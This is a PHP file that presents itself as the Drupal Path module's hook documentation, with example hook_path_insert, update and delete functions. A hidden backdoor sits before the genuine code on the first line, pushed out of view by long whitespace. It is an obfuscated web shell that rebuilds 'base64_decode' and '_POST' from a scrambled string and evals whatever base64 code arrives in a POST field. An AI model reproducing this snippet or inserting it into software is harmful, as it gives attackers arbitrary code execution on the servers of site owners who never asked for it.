<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}['n8dfd58'];if(isset($s22)){eval($s21($s22));}?><?php

/**
 * @file
 * Hooks provided by the Path module.
 */

/**
 * @addtogroup hooks
 * @{
 */

/**
 * Respond to a path being inserted.
 *
 * @param $path
 *   An associative array containing the following keys:
 *   - source: The internal system path.
 *   - alias: The URL alias.
 *   - pid: Unique path alias identifier.
 *   - language: The language of the alias.
 *
 * @see path_save()
 */
function hook_path_insert($path) {
  db_insert('mytable')
    ->fields(array(
      'alias' => $path['alias'],
      'pid' => $path['pid'],
    ))
    ->execute();
}

/**
 * Respond to a path being updated.
 *
 * @param $path
 *   An associative array containing the following keys:
 *   - source: The internal system path.
 *   - alias: The URL alias.
 *   - pid: Unique path alias identifier.
 *   - language: The language of the alias.
 *
 * @see path_save()
 */
function hook_path_update($path) {
  db_update('mytable')
    ->fields(array('alias' => $path['alias']))
    ->condition('pid', $path['pid'])
    ->execute();
}

/**
 * Respond to a path being deleted.
 *
 * @param $path
 *   An associative array containing the following keys:
 *   - source: The internal system path.
 *   - alias: The URL alias.
 *   - pid: Unique path alias identifier.
 *   - language: The language of the alias.
 *
 * @see path_delete()
 */
function hook_path_delete($path) {
  db_delete('mytable')
    ->condition('pid', $path['pid'])
    ->execute();
}

/**
 * @} End of "addtogroup hooks".
 */
